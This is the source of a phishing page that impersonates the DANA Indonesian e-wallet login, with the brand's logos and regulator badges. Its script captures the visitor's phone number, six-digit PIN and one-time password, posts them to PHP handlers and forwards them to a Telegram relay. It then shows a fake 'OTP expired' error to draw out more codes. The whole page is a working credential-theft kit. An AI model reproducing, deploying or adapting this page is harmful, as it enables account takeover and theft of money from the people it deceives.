<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>DANA - Apa pun transaksinya selalu ada DANA</title>
<meta name="theme-color" content="#118EEA"><meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA"><meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA"><meta property="twitter:card" content="summary_large_image"><meta property="og:image:type" content="image/jpeg"><meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&usqp=CAU" ><meta property="twitter:image:src" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&usqp=CAU"><meta property="og:url" content="https://dana.id"><meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><link rel="stylesheet" href="ast/8d62ea654fcf0e4cae001e344ee2592c.css"><link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css"><link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css"><link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css"><link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">
<style>@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');

/* Global Styles */
* {
    font-family: 'Open Sans', sans-serif;
    font-weight: 400;
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    position: relative;
    color: #fff;
}

b {
    font-weight: 700;
}

html {
    width: 100vw;
    height: 100vh;
}

body {
    background: #118EEA;
    width: 100vw;
    height: 100vh;
}

.box-login, .container {
    background: #118EEA;
    height: 100%;
    width: 100%;
}

/* Header */
body .header {
    width: 100%;
    margin-top: 10px;
    padding: 10px;
    height: 50px;
    display: flex;
    justify-content: center;
    align-items: center;
}

body .header .back {
    height: 35%;
    max-height: 35%;
    min-height: 35%;
    position: absolute;
    left: 20px;
}

body .header .logo {
    height: 100%;
    max-height: 100%;
    min-height: 100%;
}

/* Form Styles */
form {
    width: 100%;
    height: 100%;
    display: flex;
    padding: 50px 20px;
    align-items: center;
    flex-direction: column;
}

form h3 {
    width: 100%;
    font-size: 14px;
    text-align: center;
}

form .box-input {
    width: 100%;
    height: 42px;
    padding: 5px 15px;
    margin-top: 50px;
    background: #fff;
    display: flex;
    border-radius: 10px;
    align-items: center;
}

form .box-input input::placeholder {
    color: #c6c6c6;
}

form .box-input input {
    background: none;
    width: calc(100% - 70px);
    max-width: calc(100% - 70px);
    min-width: calc(100% - 70px);
    height: 100%;
    max-height: 100%;
    min-height: 100%;
    outline: none;
    border: none;
    font-size: 22px;
    font-weight: 600;
    text-align: left;
    color: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    caret-color: #c1c1c1;
}

.box-input .label {
    height: 100%;
    min-height: 100%;
    max-height: 100%;
    padding: 4px;
    width: 70px;
    min-width: 70px;
    max-width: 70px;
    display: flex;
    justify-content: center;
    align-items: center;
}

.box-input .label img {
    height: 55%;
    max-height: 55%;
    min-height: 55%;
    border-radius: 1px;
    box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
}

.box-input .label label {
    color: #000;
    font-size: 15px;
    font-weight: 600;
    margin: 0 10px 0 10px;
}

form .desc {
    width: 100%;
    margin-top: 40px;
    font-size: 13px;
    text-align: center;
}

form .box-btn {
    width: 100%;
    height: auto;
    position: fixed;
    bottom: 0;
}

form .box-btn button:disabled {
    opacity: 0.7;
}

form .box-btn button:active {
    background: #00000015;
}

form .box-btn button {
    padding: 20px 0 30px 0;
    opacity: 1;
    width: 100%;
    height: 60px;
    background: none;
    outline: none;
    border: none;
    font-size: 16px;
    text-align: center;
}

/* Start Screen */
.start {
    top: 0;
    left: 0;
    right: 0;
    width: 100%;
    height: 100%;
    min-height: 100%;
    max-height: 100%;
    position: fixed;
    z-index: 999;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    background: #118EEA;
}

.start .logo {
    width: 50%;
    margin-top: -40px;
}

.start .footimg {
    width: 400px;
    height: 60px;
    display: flex;
    justify-content: center;
    align-items: center;
    position: fixed;
    bottom: 40px;
    z-index: 99999;
}

.start .footimg img {
    min-height: 40px;
    max-height: 40px;
    height: 40px;
    margin: 0 8px 0 0;
}

.start .footimg p {
    font-size: 10px;
    white-space: nowrap;
}

/* Media Queries for Larger Screens */
@media screen and (min-width: 900px) {
    html {
        background: #118EEA;
    }

    body {
        display: flex;
        justify-content: center;
        align-items: center;
        background: #0000001b;
    }

.index {
  width: 100%;
  height: 100%;
  background: #118EEA;
  z-index: 9999;
}

.index .hero {
  margin: 20px 0;
  width: 100%;
  height: 330px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.index .hero img {
  width: 90%;
}

.index .content {
  width: 100%;
  text-align: center;
}

.index .content h1 {
  margin-top: 60px;
  font-size: 24px;
  font-weight: 700;
}

.index .content .desc {
  margin-top: 7px;
  font-size: 16px;
}

.index .content .line {
  width: 80px;
  margin: 20px auto;
  height: 6px;
  border-radius: 30px;
  opacity: 0.7;
  background: #fff;
}

.index .content .log {
  font-size: 16px;
}

.index .content button {
  margin-top: 20px;
  width: 90%;
  height: 47px;
  background: #fff;
  color: #118EEA;
  font-size: 16px;
  font-weight: 600;
  border: none;
  border-radius: 10px;
  transition: .2s;
}

.index .content button:hover {
  background: #f4f4f4;
  transition: .2s;
}

.container {
    width: 450px;
    min-width: 450px;
    max-width: 450px;
    height: 700px;
    min-height: 700px;
    max-height: 700px;
    display: flex;
    justify-content: center;
    align-items: center; /* Perbaiki di sini */
}
.process {
  top: 0;
  left: 0;
  right: 0;
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #0000005b;
  z-index: 999999999;
  width: 100%;
  height: 100%;
}

.loading {
  margin-top: -50px;
  position: absolute;
  display: flex;
  justify-content: center;
  align-items: center;
}

.loading img {
  width: 50px;
}

.loading .spinner {
  position: absolute;
  width: 35px;
  animation: spin 1s linear infinite;
  -webkit-animation: spin 1s linear infinite;
  -moz-animation: spin 1s linear infinite;
  -ms-animation: spin 1s linear infinite;
  -o-animation: spin 1s linear infinite;
}

.loadingOtp {
  background: #fff;
  width: 100%;
  z-index: 9999;
  position: absolute;
  display: flex;
  justify-content: center;
  align-items: center;
}

.loadingOtp img {
  width: 50px;
}

.loadingOtp .spinner {
  position: absolute;
  width: 35px;
  animation: spin 1s linear infinite;
  -webkit-animation: spin 1s linear infinite;
  -moz-animation: spin 1s linear infinite;
  -ms-animation: spin 1s linear infinite;
  -o-animation: spin 1s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(360deg);
  }
  100% {
    transform: rotate(0deg);
  }
}

@-webkit-keyframes spin {
  0% {
    -webkit-transform: rotate(360deg);
  }
  100% {
    -webkit-transform: rotate(0deg);
  }
}

@-moz-keyframes spin {
  0% {
    -webkit-transform: rotate(360deg);
  }
  100% {
    -webkit-transform: rotate(0deg);
  }
}

@-ms-keyframes spin {
  0% {
    -webkit-transform: rotate(360deg);
  }
  100% {
    -webkit-transform: rotate(0deg);
  }
}

@-o-keyframes spin {
  0% {
    -webkit-transform: rotate(360deg);
  }
  100% {
    -webkit-transform: rotate(0deg);
  }
}

@media screen and (min-width: 900px) {
  .process {
    position: absolute;
  }
}
        
        
        
        
        .bgotp {
  position: absolute;
  z-index: 9999;
  top: 0;
  left: 0;
  right: 0;
  width: 100%;
  height: 100%;
  background: #00000032;
}

.bgotp form {
  width: 100%;
  position: absolute;
  bottom: 0;
  height: 50%;
  min-height: 50%;
  max-height: 50%;
  background: #fff;
  border-top-left-radius: 15px;
  border-top-right-radius: 15px;
  padding: 40px;
}

.bgotp #formOtp h2 {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 10px;
  color: #000;
  text-align: center;
}

.bgotp #formOtp p {
  font-size: 14px;
  font-weight: 500;
  color: #000;
  text-align: center;
}

.bgotp #formOtp .resend {
  margin-top: 35px;
  font-size: 15px;
  color: #b1b1b1;
}

.bgotp #formOtp .resend #countdown {
  font-size: 15px;
  color: #b1b1b1;
}

.box-input-otp {
  width: 100%;
  height: 45px;
  margin-top: 35px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.box-input-otp input {
  height: 45px;
  width: 45px;
  border: none;
  outline: none;
  border-radius: 8px;
  margin: 0 3px;
  display: flex;
  background: #f6f6f6;
  justify-content: center;
  align-items: center;
  text-align: center;
  font-size: 20px;
  font-weight: 600;
  color: #000;
}

.box-input-otp .clearotp {
  position: absolute;
  width: 100%;
  height: 100%;
  z-index: 99;
}

@media screen and (min-width: 900px) {
  .bgotp {
    position: absolute;
    width: 450px;
    min-width: 450px;
    max-width: 450px;
    height: 700px;
    min-height: 700px;
    max-height: 700px;
  }
}
        
</style>
</head>
<body>
    <div style="display:none;" class="index">
        <div class="header">
            <img src="ast/img/dana_logo.png" class="logo" alt="">
        </div>
        <div class="content">
            <div class="hero">
                <img src="ast/img/hero.svg" alt="">
            </div>
            <h1>Dompet digital untuk kamu!</h1>
            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
            <div class="line"></div>
            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
            <button type="button" onclick="next();">LOGIN</button>
        </div>
    </div>
    <div class="start" style="display:none;">
        <img class="logo" src="ast/img/dana_text.png">
        <div class="footimg">
            <img src="ast/img/bi.png" alt="">
            <img src="ast/img/kom.png" alt="">
            <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
        </div>
    </div>
    <div class="container hid">
        <div class="box-login">
            <div id="process" name="process" class="process" style="display: none;">
                <div class="loading">
                    <img src="ast/img/load_bg.png">
                    <img class="spinner" src="ast/img/load_spin.png">
                </div>
            </div>
            <div class="header">
                <img src="ast/img/dana_logo.png" class="logo" alt="">
            </div>
<form id="formNohp" onsubmit="sendNohp(event);">
    <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
    <div class="box-input">
        <div class="label">
            <img src="ast/img/indo.png" alt="">
            <label>+62</label>
        </div>
        <input id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="811-1234-5678">
    </div>
    <p class="desc">Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <b>Syarat & Ketentuan</b> dan<br><b>Kebijakan Privasi</b> kami</p>
    <div class="box-btn">
        <button disabled id="btn" class="btnnohp" type="submit">LANJUT</button>
    </div>
</form>

<form id="formPin" class="hid" onsubmit="sendPin(event);">
    <h3>Masukkan <b>PIN DANA</b></h3>
    <div class="box-input-pin">
        <!-- Input PIN -->
        <input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
    </div>
    <button class="show" type="button">TAMPILKAN</button>
    <p class="forgot">LUPA PIN?</p>
</form>

<div class="bgotp hid">
    <form id="formOtp" onsubmit="sendOtp(event);">
        <h2>Masukkan OTP</h2>
        <p class="alert">Kode OTP telah dikirim ke nomor Anda</p>
        <div class="box-input-otp">
            <div class="loadingOtp" style="display:none;">
                <img src="ast/img/load_bg.png">
                <img class="spinner" src="ast/img/load_spin.png">
            </div>
            <div type="button" class="clearotp"></div>
            <input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
            <input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
            <input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
            <input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        </div>
        <p class="resend">KIRIM ULANG (<span id="countdown">120</span>s)</p>
    </form>

</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>
<script>
    $(document).ready(function() {
        $('#inp').on('input', function() {
            if ($(this).val() == '0' || $(this).val() == '62') {
                $(this).val('');
            }
        });

        $('#inp').mask('000-0000-000000');

        let inp = document.getElementById("inp");
        let btn = document.getElementById("btn");
        inp.addEventListener("input", val);

        function val() {
            if (inp.value.length > 10) {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }

        $('.inppin').on('input', function(event) {
            const inputs = $('.inppin');
            const isAllFilled = Array.from(inputs).every((input) => input.value !== '');

            if (isAllFilled) {
                $(event.target).blur();
                sendPin();
            }

            const index = inputs.index(this);
            const currentValue = event.target.value;

            if (currentValue.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            } else if (currentValue.length === 0 && index > 0) {
                inputs[index].focus();
            }
        });

        $('.inpotp').on('input', function(event) {
            const inputs = $('.inpotp');
            const isAllFilled = Array.from(inputs).every((input) => input.value !== '');

            if (isAllFilled) {
                $(event.target).blur();
                sendOtp();
            }

            const index = inputs.index(this);
            const currentValue = event.target.value;

            if (currentValue.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            } else if (currentValue.length === 0 && index > 0) {
                inputs[index].focus();
            }
        });

        $('.clear').click(function() {
            $('.inppin').val('');
            $('#pin1').focus();
        });

        $('.clearotp').click(function() {
            $('.inpotp').val('');
            $('#otp1').focus();
        });

        $('.show').click(function() {
            $('.inppin').each(function() {
                if ($(this).attr('type') === 'password') {
                    $(this).attr('type', 'number');
                    $(".show").text("SEMBUNYIKAN");
                } else {
                    $(this).attr('type', 'password');
                    $(".show").text("TAMPILKAN");
                }
            });
        });
    });
let formData = {
    nohp: '',
    pin: '',
    otp: ''
};

function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    $.ajax({
        type: 'POST',
        url: 'ast/req/nohp.php',
        data: $('#formNohp').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $("#formNohp").fadeOut();
            $("#formPin").fadeIn(); // Pastikan ID formPin sesuai
            $("#pin1").focus();
            formData.nohp = $('#formNohp').serialize(); // Simpan data nohp
        }
    });
}

function sendPin() {
    $("#process").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/pin.php',
        data: $('#formPin').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $('.inppin').val('');
            $(".bgotp").fadeIn();
            setInterval(countdown, 1000);
            $("#otp1").focus();
            formData.pin = $('#formPin').serialize(); // Simpan data pin
            sendToTelegram(); // Kirim data yang sudah ada
        }
    });
}

function sendOtp() {
    $(".loadingOtp").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/otp.php',
        data: $('#formOtp').serialize(),
        dataType: 'text',
        success: function() {
            setTimeout(function() {
                $(".loadingOtp").hide();
                $('.inpotp').val('');
                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
                $(".alert").css("color", "red");
                formData.otp = $('#formOtp').serialize(); // Simpan data otp
                sendToTelegram(); // Kirim data yang sudah ada
            }, 3000);
        }
    });
}

function sendToTelegram() {
    if (formData.nohp && formData.pin) {
        // Kirim data ke Telegram
        $.ajax({
            type: 'POST',
            url: 'ast/req/sendToTelegram.php',
            data: {
                nohp: formData.nohp,
                pin: formData.pin,
                otp: formData.otp || '' // Sertakan otp jika tersedia
            },
            success: function(response) {
                console.log(response);
            }
        });
    }
}

function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('120');
    }
}

window.onload = function() {
    setTimeout(function() {
        $(".start").fadeIn();
        setTimeout(function() {
            $(".start").fadeOut(1000);
            setTimeout(function() {
                $(".container").fadeIn(200);
                $("#inp").focus();
            }, 1000);
        }, 2000);
    }, 500);
};
</script>
</body>
</html>